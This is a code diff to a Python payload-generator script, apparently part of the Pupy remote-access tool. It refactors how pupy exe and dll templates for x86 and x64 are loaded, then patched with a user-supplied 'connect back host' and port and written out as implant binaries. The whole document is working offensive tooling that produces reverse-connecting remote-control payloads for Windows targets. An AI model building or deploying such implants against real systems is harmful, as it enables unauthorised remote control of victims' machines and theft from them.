@@ -19,6 +19,18 @@ import argparse
 import sys
 import os.path
 
+def get_edit_pupyx86_dll(host, ip):
+	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip)
+
+def get_edit_pupyx64_dll(host, ip):
+	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), host, ip)
+
+def get_edit_pupyx86_exe(host, ip):
+	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), host, ip)
+
+def get_edit_pupyx64_exe(host, ip):
+	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), host, ip)
+
 def get_edit_binary(path, host, ip):
 	binary=b""
 	with open(path, 'rb') as f:
@@ -45,35 +57,35 @@ def get_edit_binary(path, host, ip):
 
 if __name__=="__main__":
 	parser = argparse.ArgumentParser(description='Process some integers.')
-	parser.add_argument('-t', '--type', default='exe_x86', help="exe_x86/dll_x86 exe_x64/dll_x64 (default: exe_x86)")
+	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
 	parser.add_argument('-o', '--output', help="output path")
 	parser.add_argument('-p', '--port', type=int, default=443, help="connect back ip (default:443)")
 	parser.add_argument('host', help="connect back host")
 	args=parser.parse_args()
 	outpath=None
 	if args.type=="exe_x86":
-		binary=get_edit_binary(os.path.join("payloads","pupyx86.exe"), args.host, args.port)
+		binary=get_edit_pupyx86_exe(args.host, args.port)
 		outpath="pupyx86.exe"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="exe_x64":
-		binary=get_edit_binary(os.path.join("payloads","pupyx64.exe"), args.host, args.port)
+		binary=get_edit_pupyx64_exe(args.host, args.port)
 		outpath="pupyx64.exe"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x64":
-		binary=get_edit_binary(os.path.join("payloads","pupyx64.dll"), args.host, args.port)
+		binary=get_edit_pupyx64_dll(args.host, args.port)
 		outpath="pupyx64.dll"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x86":
-		binary=get_edit_binary(os.path.join("payloads","pupyx86.dll"), args.host, args.port)
+		binary=get_edit_pupyx86_dll(args.host, args.port)
 		outpath="pupyx86.dll"
 		if args.output:
 			outpath=args.output
